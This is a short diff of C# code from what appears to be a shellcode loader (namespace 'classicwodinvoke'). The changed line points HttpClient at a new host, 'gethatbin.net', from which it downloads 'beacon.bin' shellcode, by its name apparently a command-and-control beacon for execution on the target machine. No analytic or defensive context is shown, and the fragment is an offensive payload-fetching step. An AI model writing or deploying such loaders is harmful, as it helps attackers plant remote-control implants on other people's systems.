@@ -52,7 +52,7 @@ namespace classicwodinvoke
                 using (var client = new HttpClient(handler))
                 {
                     // Download the shellcode
-                    shellcode = await client.GetByteArrayAsync("https://d8l4xxrfk9hyp.cloudfront.net/beacon.bin");
+                    shellcode = await client.GetByteArrayAsync("https://gethatbin.net/beacon.bin");
                 }
             }
 
